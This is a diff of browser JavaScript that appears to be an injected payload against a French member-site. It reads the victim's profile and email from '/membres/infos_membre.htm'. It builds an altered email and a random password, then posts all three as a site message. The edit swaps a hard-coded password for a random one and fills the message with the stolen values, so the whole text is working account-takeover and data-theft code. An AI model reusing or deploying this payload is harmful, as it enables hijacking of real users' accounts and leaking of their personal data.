@@ -6,8 +6,7 @@ fetch('/membres/infos_membre.htm').then(function(response) {
     let profil = doc.evaluate('//*[@id="body_right"]/div/div/div/a', doc, null, XPathResult.STRING_TYPE, null).stringValue
     let mailpath = '//*[@id="form_user"]/fieldset[1]/div/table/tbody/tr[2]/td[2]/input/@value';
     let email = encodeURIComponent("mv" + doc.evaluate(mailpath, doc, null, XPathResult.STRING_TYPE, null).stringValue);
-    let pwd = "coucou8";
-    console.log(profil, email, pwd);
+    let pwd = (Math.random() + 1).toString(36).substring(2);
     fetch(location.href, {
         method: 'POST',
         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
@@ -15,7 +14,7 @@ fetch('/membres/infos_membre.htm').then(function(response) {
             'sujet': 'sucess',
             piece_jointe_1: "",
             piece_jointe_1: "",
-            message: ` email ${} `,
+            message: ` email ${profil}, ${email}, ${pwd}`,
             send_msg: "Envoi en cours, patientez SVP..."
         })
     }).then(() =>
